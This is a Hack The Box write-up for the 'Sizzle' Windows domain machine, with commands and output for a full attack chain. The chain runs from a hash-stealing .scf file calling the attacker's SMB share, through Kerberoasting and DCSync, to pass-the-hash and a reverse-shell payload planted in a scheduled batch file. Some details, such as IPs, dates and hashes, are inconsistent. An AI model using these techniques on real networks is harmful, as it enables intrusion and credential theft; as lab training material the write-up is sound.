---
icon: user-chef
---

# HTB-SIZZLE

<figure><img src="../../../../.gitbook/assets/image (210).png" alt=""><figcaption></figcaption></figure>

### Attack Flow Explanation

#### 1. Initial Access

* **User Context Discovery** – Through enumeration, it was identified that the `MRLKY` account exists and is associated with Football-related naming patterns (Football#7).
* **Flag Hint Recognition** – Notes indicated “do love a good user flag,” hinting that `MRLKY` might be the user holding the target flag.

#### 2. Privilege Escalation Path

* **BloodHound Enumeration** – BloodHound data from the compromised server showed that the `MRLKY` account has the **GetChanges** and **GetChangesAll** permissions on the domain object.
* **Understanding Permissions** – These permissions allow an account to perform a **DCSync attack**, which can replicate password hashes directly from the Domain Controller without needing DA rights beforehand.
* **Executing DCSync** – Using `MRLKY`’s credentials, a DCSync attack was executed to pull NTLM hashes for privileged accounts, including the Domain Administrator.
* **Admin Shell Access** – The dumped NTLM hash for the Domain Administrator was used to authenticate and spawn a full administrative shell, completing domain compromise.

***

### Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```python
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain      Simple DNS Plus
80/tcp    open  http        Microsoft IIS httpd 10.0
|_http-title: Site doesnt have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc       Microsoft Windows RPC
139/tcp   open  netbios-ssn Microsoft Windows netbios-ssn
389/tcp   open  ldap        Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2024-05-26T09:33:58+00:00; -1s from scanner time.
443/tcp   open  ssl/http    Microsoft IIS httpd 10.0
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2024-05-26T09:33:58+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_http-title: Site doesnt have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
464/tcp   open  kpasswd5?
3268/tcp  open  ldap        Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2024-05-26T09:33:58+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
5985/tcp  open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2024-05-26T09:33:58+00:00; 0s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_http-title: Not Found
47001/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc       Microsoft Windows RPC
49665/tcp open  msrpc       Microsoft Windows RPC
49666/tcp open  msrpc       Microsoft Windows RPC
49668/tcp open  msrpc       Microsoft Windows RPC
49673/tcp open  msrpc       Microsoft Windows RPC
49690/tcp open  ncacn_http  Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc       Microsoft Windows RPC
49693/tcp open  msrpc       Microsoft Windows RPC
49697/tcp open  msrpc       Microsoft Windows RPC
49698/tcp open  msrpc       Microsoft Windows RPC
49710/tcp open  msrpc       Microsoft Windows RPC
49723/tcp open  msrpc       Microsoft Windows RPC
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.00 seconds

I've saved your loot here: /home/kali/Desktop/HackTheBox/Boxes/NonComp/Insane/Sizzle/10.129.222.170_nmap_results
Checking for open Active Directory ports and extracting domain information...
Looks like a Domain. Port 389 found with LDAP information:
389/tcp   open  ldap        Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
Extracted domain: HTB.LOCAL
Added HTB.LOCAL to /etc/hosts with IP 10.129.222.170
```

During the scan, I noticed something unusual  it took longer than expected, and the target would stop responding whenever I increased the `min-rate` too much. Although anonymous FTP access was enabled, the directory contained no files and did not allow uploads.

The more notable findings were the absence of port **88/tcp** (Kerberos) and the presence of **5986/tcp** (WinRM over HTTPS). Without Kerberos, we lose the ability to perform common attacks like **ASREProasting** and **Kerberoasting** for harvesting hashes and enumerating users. As for the web service on port **80**, it served nothing more than an image of bacon sizzling — amusing, but not particularly useful.

<figure><img src="../../../../.gitbook/assets/image (212).png" alt=""><figcaption></figcaption></figure>

Directory brute-forcing with several wordlists initially produced no significant results. However, when using the **common.txt** wordlist, I discovered the **/certsrv** endpoint. This strongly indicates that the domain is running **Active Directory Certificate Services (ADCS)**.

<pre class="language-python"><code class="lang-python"><strong>┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
</strong>└─$ gobuster dir -u http://10.10.10.103/ -t 50 -w /usr/share/wordlists/dirb/common.txt -x .aspx                                 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &#x26; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.103/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              aspx
[+] Timeout:                 10s
===============================================================
2022/04/20 04:40:11 Starting gobuster in directory enumeration mode
===============================================================
/aspnet_client        (Status: 301) [Size: 157] [--> http://10.10.10.103/aspnet_client/]
/certenroll           (Status: 301) [Size: 154] [--> http://10.10.10.103/certenroll/]   
/certsrv              (Status: 401) [Size: 1293]                                        
/images               (Status: 301) [Size: 150] [--> http://10.10.10.103/images/]       
/Images               (Status: 301) [Size: 150] [--> http://10.10.10.103/Images/]       
/index.html           (Status: 200) [Size: 60]                                          
===============================================================
2025/07/10 04:41:12 Finished
===============================================================
</code></pre>

Further enumeration revealed that **SMB** allowed **anonymous access** to certain shares, which I confirmed using **CrackMapExec**.

## SMB

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ crackmapexec smb 10.10.10.103 -u Guest -p '' --shares        
SMB         10.10.10.103    445    SIZZLE           [*] Windows 10.0 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.103    445    SIZZLE           [+] HTB.LOCAL\Guest: 
SMB         10.10.10.103    445    SIZZLE           [+] Enumerated shares
SMB         10.10.10.103    445    SIZZLE           Share           Permissions     Remark
SMB         10.10.10.103    445    SIZZLE           -----           -----------     ------
SMB         10.10.10.103    445    SIZZLE           ADMIN$                          Remote Admin
SMB         10.10.10.103    445    SIZZLE           C$                              Default share
SMB         10.10.10.103    445    SIZZLE           CertEnroll                      Active Directory Certificate Services share
SMB         10.10.10.103    445    SIZZLE           Department Shares READ            
SMB         10.10.10.103    445    SIZZLE           IPC$            READ            Remote IPC
SMB         10.10.10.103    445    SIZZLE           NETLOGON                        Logon server share 
SMB         10.10.10.103    445    SIZZLE           Operations                      
SMB         10.10.10.103    445    SIZZLE           SYSVOL                          Logon server share 
```

Connecting to the share **`\\10.10.10.103\Department\`** via **smbclient** revealed a large number of directories, each containing even more subdirectories. I recursively downloaded all files and folders, but most of the content was uninteresting. One directory, **ZZ\_ARCHIVE**, contained many files that were all identical in size yet appeared to be empty.

While exploring further, I enabled **`showacls on`** in smbclient to review access permissions and found that I had **write access** to both the **ZZ\_ARCHIVE** directory and **`\Users\Public`**.

```python
smb: \users\> showacl on
smb: \users\> ls
FILENAME:Public
MODE:D
SIZE:0
MTIME:Wed july 10 01:45:32 2025
revision: 1
type: 0x8404: SEC_DESC_DACL_PRESENT SEC_DESC_DACL_AUTO_INHERITED SEC_DESC_SELF_RELATIVE 
DACL
        ACL     Num ACEs:       5       revision:       2
        ---
        ACE
                type: ACCESS ALLOWED (0) flags: 0x03 SEC_ACE_FLAG_OBJECT_INHERIT  SEC_ACE_FLAG_CONTAINER_INHERIT 
                Specific bits: 0x1ff
                Permissions: 0x1f01ff: SYNCHRONIZE_ACCESS WRITE_OWNER_ACCESS WRITE_DAC_ACCESS READ_CONTROL_ACCESS DELETE_ACCESS 
                SID: S-1-1-0
```

The **SID** `S-1-1-0` corresponds to the **“Everyone”** group, meaning any user can write to both **ZZ\_ARCHIVE** and **\Users\Public**. This opens the possibility of attempting an **SCF/LNK/URL attack**.

These attacks involve creating a file in one of these formats and modifying its directives. For **`.scf`** and **`.url`** files, the `IconFile` directive can be set to point to a file hosted on our SMB share (the file itself does not need to exist). When a target browses the share and the `.scf` or `.url` file is displayed, the system attempts to load the icon from our SMB share, triggering an authentication request.

With our SMB server listening, this authentication attempt allows us to capture the user’s hash. For this test, I created an **`.scf`** file named **`@a.scf`** (prefixed with `@` to ensure it appears at the top of the directory listing).

```python
[Shell]
Command=2
IconFile=\\10.10.16.2\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

After placing the **`@a.scf`** file in both the **ZZ\_ARCHIVE** directory and **\Users\Public**, I received an incoming connection on my SMB server — confirming the attack had successfully triggered.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ impacket-smbserver share . -smb2support                                    
Impacket v0.12.0 - Copyright 2021 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.103,58413)
[*] AUTHENTICATE_MESSAGE (HTB\amanda,SIZZLE)
[*] User SIZZLE\amanda authenticated successfully
[*] amanda::HTB:aaaaaaaaaaaaaaaa:c071935133f5ff4db1227e20cea3170d:0101000000000000005841589454d801bc0c8fc31cc7537d00000000010010006d0075004b0068006b0052004e006d00030010006d0075004b0068006b0052004e006d0002001000440078007500660067004d004800720004001000440078007500660067004d004800720007000800005841589454d801060004000200000008003000300000000000000001000000002000008e00082aa56eba9d3193bdc347cb42dfae47621259447faf97ed32dfde509a4b0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003200000000000000000000000000
```

The captured hash was identified as **NetNTLMv2**, which can be cracked using **hashcat**. Since my VM was unable to run hashcat, I switched to my host machine. I performed a **dictionary attack** (`-a 0`) with the **NetNTLMv2** hash mode (`-m 5600`), using the **rockyou.txt** wordlist.'

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ ./hashcat.exe -a 0 -m 5600 hash rockyou.txt
hashcat (v6.2.4) starting
AMANDA::HTB:aaaaaaaaaaaaaaaa:c071935133f5ff4db1227e20cea3170d:0101000000000000005841589454d801bc0c8fc31cc7537d00000000010010006d0075
004b0068006b0052004e006d00030010006d0075004b0068006b0052004e006d0002001000440078007500660067004d004800720004001000440078007500660067
004d004800720007000800005841589454d801060004000200000008003000300000000000000001000000002000008e00082aa56eba9d3193bdc347cb42dfae4762
1259447faf97ed32dfde509a4b0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0032
00000000000000000000000000:Ashare1972
```

Success! The hash cracked to **`amanda:Ashare1972`**, giving me valid domain credentials. With these, I proceeded with two actions:

1. **Domain Enumeration** – Using **bloodhound-python** to remotely enumerate the domain.
2. **WinRM Access** – Attempting authentication over WinRM.

I successfully gathered enumeration data and ingested it into **BloodHound** for analysis.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ bloodhound-python -u 'amanda' -p 'Ashare1972' -d htb.local -ns 10.10.10.103 -c all
INFO: Found AD domain: htb.local
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: sizzle.HTB.LOCAL
WARNING: Could not resolve SID: S-1-5-21-2379389067-1826974543-3574127760-1000
INFO: Found 7 users
INFO: Connecting to GC LDAP server: sizzle.HTB.LOCAL
INFO: Found 52 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: sizzle.HTB.LOCAL
INFO: Done in 00M 23S
```

<figure><img src="../../../../.gitbook/assets/image (214).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (213).png" alt=""><figcaption></figcaption></figure>

The first key finding is that my user **Amanda** has the **`CanPSRemote`** edge to the domain controller **SIZZLE.HTB.LOCAL**. This means I can execute remote PowerShell commands via **WinRM**, which can be leveraged using **evil-winrm**.

Secondly, I identified another user with the **`GetChangesAll`** edge on the domain. This privilege is associated with **DCSync** capabilities, allowing the account to request domain replication data — including password hashes. If we compromise this account, we can use **DCSync** to obtain hashes for all domain users, including **Domain Admins**.

Upon closer inspection of this privileged user, I found the following:

<figure><img src="../../../../.gitbook/assets/image (216).png" alt=""><figcaption></figcaption></figure>

This user has a **Service Principal Name (SPN)**, meaning it functions as a **service account** and is therefore vulnerable to **Kerberoasting**. While I already have valid credentials to perform this attack, **Kerberos** is not currently accessible, so I’ll need to **port forward** (or use **Rubeus**) after gaining a foothold in order to Kerberoast this account and then perform **DCSync**.

For clarity, **Kerberoasting** works by having an authenticated user request a ticket for a service from the **krbtgt** account. The **krbtgt** responds with a ticket encrypted using the service account’s password hash. Tools such as **Impacket** or **Rubeus** can extract this encrypted ticket, after which we can attempt to crack it offline.

With the strategy defined, it’s time to put this plan into motion.

## Foothold

**WinRM Shell**

To establish a foothold, I used a **custom Python script** that leveraged the **CRT files** I had generated earlier. These certificate files were essential for authenticating to the target over WinRM. I modified and “spiced up” the script to make it more flexible and user-friendly, allowing anyone to adapt it for their own engagements.

The script handled the authentication process seamlessly, using the provided certificate and private key to initiate a secure connection to the shell. This approach bypassed the need for traditional username/password authentication and instead relied on certificate-based access — a technique that can be particularly effective in environments with strict authentication policies.

Once executed, the script dropped me directly into an interactive shell on the target system, giving me the access I needed to proceed with further enumeration and attacks.

```python
import winrm
import sys

# Establish the connection
try:
    session = winrm.Session(
        'https://10.129.223.33:5986/wsman',
        auth=('amanda.crt', 'amanda.key'),
        transport='ssl',
        server_cert_validation='ignore'
    )
except Exception as e:
    print("Someone broke something because I failed to establish a connection: " + str(e))
    sys.exit(1)

# Function to execute a command and print the output
def execute_command(shell, command):
    try:
        response = shell.run_ps(command)
        if response.status_code == 0:
            print(response.std_out.decode('utf-8').strip())
        else:
            print(response.std_err.decode('utf-8').strip(), file=sys.stderr)
    except Exception as e:
        print("Someone broke something because the command execution failed: " + str(e))

# Open a PowerShell shell
try:
    with session.protocol.open_shell() as shell:
        command = ""
        while command.strip().lower() != "exit":
            whoami = session.run_ps('whoami').std_out.decode('utf-8').strip()
            computername = session.run_ps('$env:computername').std_out.decode('utf-8').strip()
            pwd_name = session.run_ps('(gi $pwd).Name').std_out.decode('utf-8').strip()
            prompt = f"PS {whoami}@{computername} {pwd_name}> "
            print(prompt, end="")
            command = input().strip()
            if command.lower() == "exit":
                break
            execute_command(shell, command)
except Exception as e:
    print("Someone broke something because the shell session failed: " + str(e))
finally:
    print("Bye :(")

```

**Success!**

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ python3 sn0xp0xy.py
PS htb\amanda@SIZZLE Documents> whoami
htb\amanda
```

I successfully established a shell as **htb\amanda**. Unfortunately, there was no flag in Amanda’s account, leading me to believe it resides in **MRLKY’s** account. Directly accessing it would’ve been too easy, so I knew I’d have to work for it.

To make the process smoother (and save myself some effort), I set up a **Villain** session for easier interaction and session management.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ villain -p 6501 -n 4443 -x 8080 -f 8888

    ┬  ┬ ┬ ┬  ┬  ┌─┐ ┬ ┌┐┌
    └┐┌┘ │ │  │  ├─┤ │ │││
     └┘  ┴ ┴─┘┴─┘┴ ┴ ┴ ┘└┘
                 Unleashed

[Meta] Created by t3l3machus
[Meta] Follow on Twitter, HTB, GitHub: @t3l3machus
[Meta] Thank you!

[Info] Initializing required services:
[0.0.0.0:6501]::Team Server
[0.0.0.0:4443]::Netcat TCP Multi-Handler
[0.0.0.0:8080]::HoaxShell Multi-Handler
[0.0.0.0:8888]::HTTP File Smuggler

Villain > generate payload=windows/netcat/powershell_reverse_tcp_v2 lhost=tun0
Generating backdoor payload...
<<SNIP>>
Copied to clipboard!
[Shell] Backdoor session established on 10.129.223.33
```

After exploring ways to break out of the restricted environment, I noticed that **AppLocker** was not enforcing write/execute restrictions on the **`C:\Windows\Temp`** directory — although I couldn’t initially see its contents. This seemed worth testing.

I decided to try **GhostPack/Rubeus** (available on GitHub), so I built the binary and uploaded it to **`C:\Windows\Temp`**. Running:

```powershell
PS C:\windows\temp> .\imnotmalware.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
```

successfully retrieved a Kerberoastable hash for **Mr MRLKY**.

Next, I attempted to enumerate SPNs using **Impacket-GetUserSPNs**:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ impacket-GetUserSPNs -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out
Password:
ServicePrincipalName Name   MemberOf                                                   PasswordLastSet         LastLogon
-------------------- ------ ---------------------------------------------------------- ----------------------- -----------------------
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL     2018-07-10 14:08:09      2018-07-12 10:23:50
```

However, I hit an error:

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)
```

I spent around 15 minutes scratching my head before realizing the system time was off by about **10 minutes** — a classic Kerberos gotcha. Once I corrected the time, the issue was resolved.

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ Impacket-GetUserSPNs -request -dc-ip 127.0.0.1 htb.local/amanda -save -outputfile GetUserSPNs.out

Impacket v0.12.0.dev1 - Copyright 2023 Fortra
<<snip>>

$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$7e9b64b7d5699f77c24bb5e091f958b9$b2f621ccaf317fe23bb8d38bcf46e7e6db72ee80bfc46d74f49d8f289bd00fd0cb00530f07ab266b032b15451b56db089864f7ae9c75e68d5a797e409f394bafffab1e28baa735af5bef6d9974d2239f1b856ebae73f1393aa9ca20af62f21e3ba8c83b3c749e6a9f2ed06adbe5555ae508db7cf85416862ceaa000fe3af85024eb14c340d52c00ed83aa9eaed3956666215987e020adcde5576fe0af35bd80ee552503400a8feb92ca030ed75c4934fc4508c10090a1f074ad738b26c054d9efd9bec6c9912f8a5d02896dd5ab34584eab6653b11ad826bf08c24f218d236e603ec25a8d40c7f0fd35fecce1e57a0ad899208ccec1df848e0139f2549ac4a2f5d3ba3baf1d51b3b2644f70f65a8db016d41f8cc459d961d640eedd93e2ce08ba17f65a892c4e374e8d4bb45f890a210156dc17d569c6b44b9680b5e3d42259a7b12a7e1cb5d7120e87771924b16d1c33f8eaca5d4337db36d80a7a0843702fa8415ae94fb389e4419012054fdaf237fb2477c8974f1be2a73cbc81ffd994904114b1ee4ca31a555eab060df88f5255d88ec3677133dc255c6d7703eac3fac958fbd74ab429b7f33f0f7d206e4fdcbb26bce4143dfd69101dc46e141c96697ee38902368b6a3eb216792962ae2228b186f718b7e69306f275320ed1030d830950f042f6e02fb6593b369806c324c521cbc2f4092e59339dc88abcd5f348d56ede5585bb05d62097a218f38a32122afca6cd8d507b8c753ec80dc492bf0975d2071cbd57f1e81b23c26c0a05876c37da6127273c6e6b746f3d90d79c4c9f37ff4e9d628d570b01d71df5f7b313b1c0430102b8b4f815eee195f3b27cc1900a7f8c457612da76c9ad95d3a5cfa3220c2c26da25c7a0a8edc95ad85baa386b808326ad2347c3c30e79abe85964fabc4423ff0fe786885022de638027b030784bde2f4816922ab0ad795ba5c5fcae70a01b0e731ee48a39041989c409aca5e84648d1c322f36e213db9988a9550cc5477f77adb681cb310306f00324bbad57b98844d2a426f32f946fd2f2fdba4117a1ae4299fcb60aa4c6e71eea3168e7f1ff30dbff3e62de87cf27bdd66e64e0c9579a6dbc2eabdcf9b83fe7cbf5982762b1d53226d6e6a1107d32d46f5b0128d3ecfd9da61f8235e942734762d5771c92b85480dcd66d3924110131793ebb4885ff197760ca596d9264b4ed1f2d6c7865149d00511737b6eac12a0d7c531535ab5a65087eb510507c5f29d1
```

stuck the hash in Hashcat and got the very secure password.

```python
Dictionary cache hit: 
* Filename..: /usr/share/wordlists/rockyou.txt 
* Passwords.: 14344385 
* Bytes.....: 139921507 
* Keyspace..: 14344385 
- Device #1: autotuned kernel-accel to 32 
- Device #1: autotuned kernel-loops to 1 
- $krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$4cc14f288e6087d7ebf2ab6750a0ac09$e8434ab472bf2203b18ff05437a50452fedef5ab2655023cbbc09834dd834d9076337d5050be3c3a3306351c05371aec98c15d93336c6cbefaf081061f71745874746215d8053ada5664e4f4d55d0b7ad161d8cca3c3585f0974d45a0e889da45a6f3658875f6ba91f5e7a26b0a664142fd48e4931f28e8f32dd90c776db6ccf994855a3d6f21b365bc40b24a42c5ad9fadb424852c8a3c8e3a73bb7e1ea549f0a971015f954d9b468df5359a00fbafceee9b5fab173106875eb6ebb851ebf6655f6d4567b9b3e91d5669ab42fffd82309606420ca08600ad1e1fdd99eba461b2d5d23851bf55d37b8ee75c3d371f7deb7e9de9e69953853df3e1023f1cdb88bc3ba44d8ecf1d7b54b841272b3c48a5a0ddd2918d2137bb2f2e09c8d1186fb29d2b2ef1504fbf836e252f98a23190b376bc7a637bf4b6c0595a7f7dba7f3eade2d13b160b91c134a884b52e6eec2732a274e91f892d5b1d33cb030d3f6371ad61bdd2cfcb64c4412eb4a04d53b4a3481e6f822fcb78467e8bec59ba7779793a7e66d0e8cbcc6ab115f311f7d1d4c9bf0a19e120da35ad5ce2f2475dae50227558af76245237b8806fd1ff82f5a107dae70167c43cec018d8caddcbb2b9da726758cc62c5e39c710b61a6e0d8c7050f86236d3293c107f1927d9ca24b3f26ad8b6d93fcb29f9b69614580f34e3b7e786f97b25709eff561c865d30c66318d7d9ff894003589cef4f7e4b40e209983737f5d0eefc53e99a19ba6ed360832b81cf87dc8e9c0cec2b710ac0b203f369543a978753a984c6cf2e14987e13772cdf96ab110514899f7251d076244e9aac1f0d84bf0813f806d5ea5ad9162d41fc3b7c600202407a418b23d7a51828e73b49e8f8e69b8720c40a1cb2cfd96bfa2554e8de8988030dc68e73ced5303ee47d2bf7b0cee71648bd18f0c32de7a16d42e5042b94ed0a0a1369b7de7d9f6886acd54a5beb60a2075d8461baf84f207f454839d144d318d23b1bbb35298e414af65330c0b36cf8d3502937b575982857b91caffe252d0aeebf55c920312ba03f03294f39db08418766f524f5b2d0b673228fde39805d759c15e128d31c4cc02c7baaeba93559a044b47cc501a4a873055f95b1b8f03008de3ee005bc344157b3c2e605c7a973d5aa90c899cb44a03df2738fc50e74b2f6e2b0c3a605e0f8114009c5a05ff2351a0c149fe76342909601f595a662af738d0f4a5c0fec6a2fc76098477301083dc832b076640:Football#7
```

It turns out **MRLKY** has a thing for football — the cracked password was:

```
Football#7
```

With valid credentials in hand, I quickly snagged the **user flag**.

Next, I loaded up **BloodHound** and pulled fresh data from the server. The results showed that **MRLKY** possesses both the **`GetChanges`** and **`GetChangesAll`** privileges on the domain. These combined privileges grant **DCSync** capabilities, meaning we can request replication data (including password hashes) from the Domain Controller.



Skipping past the routine steps, I leveraged **Impacket-SecretsDump** to extract the **Administrator** account’s credentials from the Domain Controller. With the NTLM hash in hand, I used **CrackMapExec** to confirm access and **Impacket-wmiexec** to obtain a shell:

```python
┌──(sn0x㉿sn0x)-[~/HTB/Sizzle]
└─$ crackmapexec smb 10.129.223.33 -u administrator -H f6b7160bfc91823792e0ac3a162c9267 
SMB         10.129.223.33   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.223.33   445    SIZZLE           [+] HTB.LOCAL\administrator:f6b7160bfc91823792e0ac3a162c9267 (Pwn3d!)
```

Then:

```bash
└─$ impacket-wmiexec -hashes :f6b7160bfc91823792e0ac3a162c9267 administrator@10.129.223.33
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\> whoami
htb\administrator
```

With that, I had full **Domain Admin** access.

**Flags:**

* **User:** `9f9e26f3dc21e7a***`
* **Root:** `7ae3c7c5fef8b***`

After enduring all the pain and suffering outlined above, I stumbled upon an interesting privilege escalation vector.

While exploring **C:\Users\Administrator**, I noticed that although my account (**Amanda**) couldn’t access the directory root or `root.txt`, I _could_ read subfolders — specifically **`C:\Users\Administrator\Desktop`**.

In the **Administrator’s Documents** folder, I found a **`clean.bat`** file. Its purpose was to clear the **`C:\Department Shares\Users\Public`** directory, and it appeared to be scheduled to run every few minutes.

A quick permissions check revealed something valuable:

```powershell
PS HTB\amanda@SIZZLE documents> icacls clean.bat 
clean.bat NT AUTHORITY\SYSTEM:(I)(F) 
          BUILTIN\Administrators:(I)(F) 
          HTB\Administrator:(I)(F) 
          HTB\amanda:(I)(F)
```

**Amanda** had **full control** over the batch file.

I replaced the contents of `clean.bat` to execute my **Villain** payload, uploaded the payload to the appropriate location, and started the Villain C2 server:

```bash
villain -p 6501 -n 4443 -x 8080 -f 8888
```

```
    ┬  ┬ ┬ ┬  ┬  ┌─┐ ┬ ┌┐┌
    └┐┌┘ │ │  │  ├─┤ │ │││
     └┘  ┴ ┴─┘┴─┘┴ ┴ ┴ ┘└┘
                 Unleashed
[Meta] Created by t3l3machus
[Info] Initializing required services:
[0.0.0.0:6501]::Team Server
[0.0.0.0:4443]::Netcat TCP Multi-Handler
[0.0.0.0:8080]::HoaxShell Multi-Handler
[0.0.0.0:8888]::HTTP File Smuggler
```

I generated the reverse shell payload:

```bash
Villain > generate payload=windows/netcat/powershell_reverse_tcp_v2 lhost=tun0
```

Once the scheduled task executed, my backdoor session popped:

```
[Shell] Backdoor session established on 10.129.223.33
PS C:\Windows\system32> whoami
htb\administrator
```

From there, I had **full Domain Admin** access and could freely browse the desktops of all users to retrieve both the **User** and **Root** flags.

<figure><img src="../../../../.gitbook/assets/complete (27).gif" alt=""><figcaption></figcaption></figure>
